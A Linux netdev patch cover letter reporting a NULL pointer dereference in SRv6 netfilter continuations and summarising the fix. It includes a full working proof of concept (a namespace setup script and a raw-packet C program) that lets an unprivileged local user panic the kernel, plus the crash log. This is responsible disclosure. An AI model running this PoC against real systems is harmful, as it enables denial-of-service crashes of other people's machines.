Received: from mail-qk2-f12.google.com (mail-qk2-f12.google.com [74.125.230.204])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9EC4031D366
	for <netdev@vger.kernel.org>; Wed, 30 Sep 2026 18:09:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.230.204
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790791744; cv=none; b=DhZdDVpStkWzWQgtlR1wnRVvr+jHlgrHW+G8UWK5aVZHCzhyXQ7TfxvvqDFl6mlHZnK42/Q+SWFKBS8pVDeN+ohXNbsEfHTuoG1uvC8F1uMoEwDjHbRqABmn9mRXsRUf+sMN/FE9z2QE7YI0SNfnnTyOKseI1hWmxHfKqnYAXkk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790791744; c=relaxed/simple;
	bh=ukjDc9/zktg/u9GDItiHeDPglvMkrYsHTDWxAJNho2U=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=thZK8dYCjAwJKULibpPL6qVaQY49gUVgpZ/fytCxDED2nkBeZHh9afmn7yZ7rHDDBg5fhB7Bjyb71Ks1yejOkR7rSEhrlYXo/GK3lizoYohsr/gDpIL1oQljePHnoGhkzJKPUbSzggXkinWBugokS07GbBy3YmDCzJznc7k+gnU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=i/LNwmiJ; arc=none smtp.client-ip=74.125.230.204
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="i/LNwmiJ"
Received: by mail-qk2-f12.google.com with SMTP id af79cd13be357-93a2dea320fso561269285a.2
        for <netdev@vger.kernel.org>; Wed, 30 Sep 2026 11:09:02 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790791741; x=1791396541; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=JVrpPimCtNSzdbogMRd5XrKMwjl/lQ+HF+8XIaWELws=;
        b=i/LNwmiJqi/Q76eAbz3VVB8YfGQGDI4KRtJB+5evskSagfWdCh2mNFQfVGshP4jZVv
         jntHHocBdyNjD+c2LbS1IShtPBw1busP3W8jwPfu4aXJEtNer0Fzkrfm329i+g6yEqQx
         DCEG0AVbNRB8/aNzS3UJ088Visw3GnayVVT6m77HK0/HGYnCd//31/LsBOLxlDp8MsIq
         MKo9clusWwr6kHw6N5bjaDir3SBynl/2F3Pgr56xFHnxdOq1X+GMTVEsEa8HpRRIIRRp
         kzgzrtVjbcC/6NXeEzPce3ndkXd3RmJAMvazdC0I6pshLb4sVZCkr8PBLYvN3yjPGpXd
         /yJw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790791741; x=1791396541;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=JVrpPimCtNSzdbogMRd5XrKMwjl/lQ+HF+8XIaWELws=;
        b=y3DsNZ8wg/EcOrvFB/7pksOS4K96VC5WqvusCDKRbkLeURZR5EBibGDqkmlrXWMdjR
         24ktfPiAXlt8ENRc5aRpN2I/fXjbTRHmPWfTGREZkSYjYRHuNEdO4MeHh/gd6bQpw22a
         2kbxA76KHvpXpHNtJU3qzjlgh5cc/AWPh3Nk2lM6N7U6SS+wpqbwsFxCPORGQrmVAtAi
         EmC8B5CQBYvCDFGCCKmsixXhg5axb1zMhJdV1eGIo1Qx7iFycoHLoRejPWzf2cSOL6gh
         wyvijiL9+qsoNCbrV5gnEXehlQbqPpC5yhMVJN495tVFc0ViQJUoe8XCO4s4cRwIwpBN
         ul2g==
X-Gm-Message-State: AFuF++n6RDUNzfQfgzMLC5s1F4SKSqhpR6Q4/Ne/vOVPRNYJ0RxvTlfk
	3FmhtNUhhe2uHv4ICZJEq01IX+JjW27ewHiP7JtwF9B6xoqkOfQLudo4V5u59MXuUNNurKcsMzJ
	Num3IdOlE
X-Gm-Gg: AYBFou0KNGIlUlZs4HkBbNCTmnKCwqefthjQM3ysh0NBuLz9CRPQjbYzoNXdwOtsiBR
	XHCGjl+2Zuc1JNkkLkOePMUi7b6XuQ3dULIeV3kMjFx7dBgAIE73BlEpv/X9JZySZFwlPsGdAs/
	8HHLcHO6h57f3J7catJh2Mu1/2ZuvALU2e+3ggRqjteaGAzCrXNneBpRUG9i+WWs52tGF+p2gZy
	wdFymvdsnlA2D/OVRFvuCobG2A/7AolRHB6zUOyQ9U/g2oPk75PKHNqHiITRWzgEdcisTjz/LMN
	w3C7yCnZ/UMtFV0t0jHqZh9C+XJcF1YzQ86EQ1GzJsvI6KRhhRXiOfQW0lcx0bCzU4cA4oS2J1y
	a34V/6eYmi0qp/N3ys2mbAAOsjHY0mWAb+9aExLlpHCWO5i4Btf6GpZcihwCZfEf84XgveEJAzB
	HFneFUeqacpiNlRjSdHxliwecPQ6NjHBcrDx4hjRvoLRPtP8uWvftNh7651bNRmSJ16ijAcCRwh
	/5Uxvj9
X-Received: by 2002:a05:620a:6602:b0:939:31b5:4e08 with SMTP id af79cd13be357-93ca9330afemr364149585a.0.1790791741093;
        Wed, 30 Sep 2026 11:09:01 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([191.222.220.30])
        by smtp.gmail.com with ESMTPSA id af79cd13be357-93cb64e2fb6sm21862185a.20.2026.09.30.11.08.55
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 30 Sep 2026 11:09:00 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: andrea.mayer@uniroma2.it,
	davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	pablo@netfilter.org,
	contact@proelbtn.com,
	vega@nebusec.ai,
	sashiko-bot@kernel.org,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] seg6: validate state in netfilter continuations
Date: Thu,  1 Oct 2026 02:08:52 +0800
Message-ID: <cover.1790748418.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We reproduced a NULL pointer dereference in the SRv6 netfilter
continuation path in net/ipv6/seg6_local.c. A local unprivileged user can
trigger it through user and network namespaces when unprivileged user
namespaces are enabled.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11977

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The End.DX4/End.DX6 continuations assume skb_dst(skb) still contains the
original SRv6 local route after netfilter. DNAT can drop or replace that
destination, so dereferencing its lwtstate can crash. In
seg6_iptunnel, SNAT with an outbound XFRM policy can replace the
destination before seg6_output_core() resumes. The patch validates the
SEG6 state after netfilter and resolves and holds the underlying SEG6
state across XFRM processing. The reproducer enables
net.netfilter.nf_hooks_lwtunnel=1 in its namespace.

Reproducer:

    make
    sh poc.sh namespace

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------
#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH}

SELF=$(readlink -f "$0")
DIR=$(dirname "$SELF")
BIN="$DIR/poc"

cleanup_root() {
	ip link del src0 2>/dev/null || true
	ip link del hs0 2>/dev/null || true
}

build_poc() {
	cc -O2 -Wall -Wextra -o "$BIN" "$DIR/poc.c"
}

setup_and_trigger_dx4() {
	ip link add src0 type veth peer name rt0
	ip link add hs0 type veth peer name rth0

	ip link set lo up
	ip addr add 2001:11::1/64 dev src0 nodad
	ip addr add 10.0.0.22/24 dev rth0

	ip link set src0 up
	ip link set rt0 up
	ip link set hs0 up
	ip link set rth0 up

	sysctl -wq net.ipv4.ip_forward=1
	sysctl -wq net.ipv6.conf.all.forwarding=1
	sysctl -wq net.netfilter.nf_hooks_lwtunnel=1
	sysctl -wq net.ipv4.conf.all.rp_filter=0

	ip -6 route add fc00:12:100::6004/128 table 100 \
		encap seg6local action End.DX4 nh4 10.0.0.2 dev rth0
	ip -6 rule add iif rt0 to fc00:12:100::6004/128 lookup 100 pref 100

	iptables -t nat -A PREROUTING -d 10.0.0.2 \
		-j DNAT --to-destination 10.0.0.99

	exec "$BIN" src0 rt0
}

case "${1:-namespace}" in
namespace)
	build_poc
	exec unshare -Urn -- "$SELF" inner
	;;
inner)
	setup_and_trigger_dx4
	;;
root)
	trap cleanup_root EXIT
	build_poc
	setup_and_trigger_dx4
	;;
*)
	echo "usage: $0 [namespace|root]" >&2
	exit 2
	;;
esac
------END poc.sh--------

------BEGIN poc.c------
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/icmp6.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/udp.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static uint16_t checksum(const void *data, size_t len)
{
	const uint8_t *bytes = data;
	uint32_t sum = 0;
	size_t i;

	for (i = 0; i + 1 < len; i += 2)
		sum += ((uint32_t)bytes[i] << 8) | bytes[i + 1];

	if (len & 1)
		sum += (uint32_t)bytes[len - 1] << 8;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (uint16_t)~sum;
}

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void get_if_hwaddr(int fd, const char *ifname, unsigned char *mac)
{
	struct ifreq ifr = {0};

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die("SIOCGIFHWADDR");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
}

static int get_ifindex(int fd, const char *ifname)
{
	struct ifreq ifr = {0};

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("SIOCGIFINDEX");

	return ifr.ifr_ifindex;
}

int main(int argc, char **argv)
{
	static const char payload[] = "dx4";
	struct sockaddr_ll sll = {0};
	struct ether_header *eth;
	struct ip6_hdr *ip6;
	struct iphdr *ip4;
	struct udphdr *udp;
	unsigned char src_mac[ETH_ALEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char frame[sizeof(*eth) + sizeof(*ip6) + sizeof(*ip4) +
			    sizeof(*udp) + sizeof(payload)];
	const char *tx_if;
	const char *peer_if;
	size_t off;
	int fd;

	if (argc != 3) {
		fprintf(stderr, "usage: %s <tx-if> <peer-if>\n", argv[0]);
		return 2;
	}

	tx_if = argv[1];
	peer_if = argv[2];

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
	if (fd < 0)
		die("socket(AF_PACKET)");

	get_if_hwaddr(fd, tx_if, src_mac);
	get_if_hwaddr(fd, peer_if, dst_mac);

	memset(frame, 0, sizeof(frame));
	off = 0;

	eth = (struct ether_header *)(frame + off);
	memcpy(eth->ether_shost, src_mac, ETH_ALEN);
	memcpy(eth->ether_dhost, dst_mac, ETH_ALEN);
	eth->ether_type = htons(ETH_P_IPV6);
	off += sizeof(*eth);

	ip6 = (struct ip6_hdr *)(frame + off);
	ip6->ip6_flow = htonl(6U << 28);
	ip6->ip6_plen = htons(sizeof(*ip4) + sizeof(*udp) + sizeof(payload));
	ip6->ip6_nxt = IPPROTO_IPIP;
	ip6->ip6_hops = 64;
	if (inet_pton(AF_INET6, "2001:11::1", &ip6->ip6_src) != 1)
		die("inet_pton outer src");
	if (inet_pton(AF_INET6, "fc00:12:100::6004", &ip6->ip6_dst) != 1)
		die("inet_pton outer dst");
	off += sizeof(*ip6);

	ip4 = (struct iphdr *)(frame + off);
	ip4->version = 4;
	ip4->ihl = 5;
	ip4->ttl = 64;
	ip4->protocol = IPPROTO_UDP;
	ip4->tot_len = htons(sizeof(*ip4) + sizeof(*udp) + sizeof(payload));
	ip4->saddr = inet_addr("10.0.0.1");
	ip4->daddr = inet_addr("10.0.0.2");
	ip4->check = checksum(ip4, sizeof(*ip4));
	off += sizeof(*ip4);

	udp = (struct udphdr *)(frame + off);
	udp->source = htons(4442);
	udp->dest = htons(5555);
	udp->len = htons(sizeof(*udp) + sizeof(payload));
	udp->check = 0;
	off += sizeof(*udp);

	memcpy(frame + off, payload, sizeof(payload));

	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IPV6);
	sll.sll_ifindex = get_ifindex(fd, tx_if);
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	if (sendto(fd, frame, sizeof(frame), 0, (struct sockaddr *)&sll,
		   sizeof(sll)) < 0)
		die("sendto");

	close(fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[  282.938765][    C1] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000011: 0000 [#1] SMP KASAN NOPTI
[  282.940383][    C1] KASAN: null-ptr-deref in range [0x0000000000000088-0x000000000000008f]
[  282.941364][    C1] CPU: 1 UID: 1001 PID: 9510 Comm: poc Not tainted 7.3.0-rc4-00385-ga7bfaba4823e #1 PREEMPT(full) 
[  282.942592][    C1] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  282.943657][    C1] RIP: 0010:input_action_end_dx4_finish+0x7b/0x560
[  282.944434][    C1] Code: 0f 85 88 02 00 00 e8 e4 dc 65 f7 49 89 df 48 b8 00 00 00 00 00 fc ff df 49 83 e7 fe 49 8d bf 88 00 00 00 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 78 04 00 00 48 8d bd d0 00 00 00 4d 8b b7 88 00
[  282.946549][    C1] RSP: 0018:ffa00000001c8890 EFLAGS: 00010206
[  282.947233][    C1] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000101
[  282.948117][    C1] RDX: 0000000000000011 RSI: ffffffff8a5c336c RDI: 0000000000000088
[  282.948958][    C1] RBP: ff11000031aafa80 R08: 0000000000000101 R09: ffe21c0009c10fbc
[  282.949798][    C1] R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000000
[  282.950637][    C1] R13: ff11000031aafad8 R14: 0000000000000000 R15: 0000000000000000
[  282.951476][    C1] FS:  00007f021ffa2540(0000) GS:ff110000d5775000(0000) knlGS:0000000000000000
[  282.952400][    C1] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  282.953074][    C1] CR2: 00007f021ff4a423 CR3: 000000004e14b000 CR4: 0000000000753ef0
[  282.953881][    C1] PKRU: 55555554
[  282.954263][    C1] Call Trace:
[  282.954610][    C1]  <IRQ>
[  282.954912][    C1]  input_action_end_dx4+0x366/0x480
[  282.955457][    C1]  seg6_local_input_core+0x106/0x330
[  282.956038][    C1]  seg6_local_input+0x185/0x1e0
[  282.956513][    C1]  lwtunnel_input+0x30d/0x770
[  282.956978][    C1]  ? __pfx_lwtunnel_input+0x10/0x10
[  282.957487][    C1]  ipv6_rcv+0x365/0x3d0
[  282.957899][    C1]  ? __pfx_ipv6_rcv+0x10/0x10
[  282.958361][    C1]  deliver_skb+0x182/0x270
[  282.958800][    C1]  __netif_receive_skb_core.constprop.0+0x1584/0x3320
[  282.959455][    C1]  ? lock_acquire+0x1bf/0x370
[  282.959922][    C1]  ? __pfx___netif_receive_skb_core.constprop.0+0x10/0x10
[  282.960587][    C1]  ? notifier_call_chain+0xbd/0x430
[  282.961075][    C1]  ? __lock_acquire+0x509/0x2110
[  282.961537][    C1]  ? __css_rstat_updated+0x1c0/0x570
[  282.962032][    C1]  ? __pfx___css_rstat_updated+0x10/0x10
[  282.962568][    C1]  ? __lock_acquire+0x509/0x2110
[  282.963031][    C1]  __netif_receive_skb_one_core+0xaf/0x1e0
[  282.963578][    C1]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  282.964182][    C1]  ? process_backlog+0x330/0x1540
[  282.964643][    C1]  ? process_backlog+0x330/0x1540
[  282.965101][    C1]  __netif_receive_skb+0x1d/0x160
[  282.965560][    C1]  process_backlog+0x382/0x1540
[  282.966005][    C1]  __napi_poll.constprop.0+0xb3/0x540
[  282.966493][    C1]  net_rx_action+0x9b1/0xea0
[  282.966918][    C1]  ? __pfx_net_rx_action+0x10/0x10
[  282.967384][    C1]  ? kvm_sched_clock_read+0x16/0x30
[  282.967858][    C1]  ? sched_clock+0x39/0x60
[  282.968251][    C1]  ? sched_clock_cpu+0x6c/0x550
[  282.968682][    C1]  ? __pfx_sched_clock_cpu+0x10/0x10
[  282.969147][    C1]  ? sched_clock_cpu+0x6c/0x550
[  282.969577][    C1]  ? __dev_queue_xmit+0xe49/0x4350
[  282.970029][    C1]  handle_softirqs+0x1d3/0x990
[  282.970452][    C1]  ? __dev_queue_xmit+0xe49/0x4350
[  282.970899][    C1]  do_softirq+0xad/0xe0
[  282.971270][    C1]  </IRQ>
[  282.971527][    C1]  <TASK>
[  282.971790][    C1]  __local_bh_enable_ip+0x109/0x130
[  282.972246][    C1]  ? __dev_queue_xmit+0xe49/0x4350
[  282.972695][    C1]  __dev_queue_xmit+0xe5e/0x4350
[  282.973130][    C1]  ? __might_fault+0x138/0x190
[  282.973549][    C1]  ? __pfx___dev_queue_xmit+0x10/0x10
[  282.974017][    C1]  ? __might_fault+0xe0/0x190
[  282.974432][    C1]  ? _copy_from_iter+0x14b/0x1710
[  282.974882][    C1]  ? __pfx__copy_from_iter+0x10/0x10
[  282.975344][    C1]  ? __pfx_ref_tracker_alloc+0x10/0x10
[  282.975825][    C1]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  282.976340][    C1]  ? packet_parse_headers+0x29e/0x840
[  282.976811][    C1]  ? __pfx_packet_parse_headers+0x10/0x10
[  282.977309][    C1]  packet_xmit+0x247/0x370
[  282.977705][    C1]  packet_sendmsg+0x2fd2/0x4d80
[  282.978138][    C1]  ? sock_has_perm+0x21f/0x2c0
[  282.978560][    C1]  ? __pfx_sock_has_perm+0x10/0x10
[  282.979008][    C1]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  282.979522][    C1]  ? __pfx_packet_sendmsg+0x10/0x10
[  282.979990][    C1]  ? selinux_socket_sendmsg+0x18f/0x2e0
[  282.980473][    C1]  ? __pfx_packet_sendmsg+0x10/0x10
[  282.980927][    C1]  __sys_sendto+0x4c3/0x510
[  282.981329][    C1]  ? __pfx___sys_sendto+0x10/0x10
[  282.981776][    C1]  ? sock_ioctl+0x3c8/0x6a0
[  282.982177][    C1]  ? selinux_file_ioctl+0x189/0x280
[  282.982633][    C1]  ? selinux_file_ioctl+0xbb/0x280
[  282.983083][    C1]  __x64_sys_sendto+0xe0/0x1c0
[  282.983507][    C1]  ? lockdep_hardirqs_on+0x7d/0x110
[  282.983968][    C1]  do_syscall_64+0x128/0x7b0
[  282.984377][    C1]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  282.984890][    C1] RIP: 0033:0x7f021feca046
[  282.985278][    C1] Code: 0e 0d 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 11 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 72 c3 90 55 48 83 ec 30 44 89 4c 24 2c 4c 89
[  282.986898][    C1] RSP: 002b:00007ffe7fe0e1a8 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  282.987619][    C1] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f021feca046
[  282.988292][    C1] RDX: 0000000000000056 RSI: 00007ffe7fe0e210 RDI: 0000000000000003
[  282.988966][    C1] RBP: 0000000000000003 R08: 00007ffe7fe0e1c0 R09: 0000000000000014
[  282.989637][    C1] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffe7fe0ee62
[  282.990312][    C1] R13: 00007ffe7fe0ee67 R14: 0000000000000000 R15: 0000000000000000
[  282.990987][    C1]  </TASK>
[  282.991257][    C1] Modules linked in:
[  282.991649][    C1] ---[ end trace 0000000000000000 ]---
[  282.992127][    C1] RIP: 0010:input_action_end_dx4_finish+0x7b/0x560
[  282.992145][    C1] Code: 0f 85 88 02 00 00 e8 e4 dc 65 f7 49 89 df 48 b8 00 00 00 00 00 fc ff df 49 83 e7 fe 49 8d bf 88 00 00 00 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 78 04 00 00 48 8d bd d0 00 00 00 4d 8b b7 88 00
[  282.992156][    C1] RSP: 0018:ffa00000001c8890 EFLAGS: 00010206
[  282.992166][    C1] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000101
[  282.992193][    C1] RDX: 0000000000000011 RSI: ffffffff8a5c336c RDI: 0000000000000088
[  282.992200][    C1] RBP: ff11000031aafa80 R08: 0000000000000101 R09: ffe21c0009c10fbc
[  282.992208][    C1] R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000000
[  282.992215][    C1] R13: ff11000031aafad8 R14: 0000000000000000 R15: 0000000000000000
[  282.992223][    C1] FS:  00007f021ffa2540(0000) GS:ff110000d5775000(0000) knlGS:0000000000000000
[  282.992235][    C1] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  282.992243][    C1] CR2: 00007f021ff4a423 CR3: 000000004e14b000 CR4: 0000000000753ef0
[  282.992250][    C1] PKRU: 55555554
[  282.992256][    C1] Kernel panic - not syncing: Fatal exception in interrupt
[  283.001450][    C1] Kernel Offset: disabled
[  283.001825][    C1] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Zixuan Chai

Zixuan Chai (1):
  seg6: validate state in netfilter continuations

 net/ipv6/seg6_iptunnel.c | 62 +++++++++++++++++++++++++++++-----------
 net/ipv6/seg6_local.c    | 34 ++++++++++++++++++----
 2 files changed, 73 insertions(+), 23 deletions(-)


base-commit: a7bfaba4823e3c165bb2004c74eff7c096672bc7
-- 
2.34.1
